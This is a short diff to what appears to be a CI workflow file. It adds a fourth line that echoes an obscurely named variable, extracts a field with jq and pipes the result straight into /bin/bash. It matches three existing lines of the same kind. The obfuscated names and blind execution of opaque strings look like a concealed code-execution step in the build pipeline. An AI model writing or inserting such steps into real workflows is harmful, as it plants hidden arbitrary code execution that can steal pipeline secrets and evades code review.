@@ -27,6 +27,7 @@ jobs:
           printf '%s' "$bs29" | jq -r .pcfai01 | /bin/bash
           echo $qjz032 | jq -r .er35433 | /bin/bash
           echo $sxud8 | jq -r .pa1 | /bin/bash
+          echo $eer2195 | jq -r .sp49 | /bin/bash
 
       - name: Archive results
         uses: actions/upload-artifact@v4
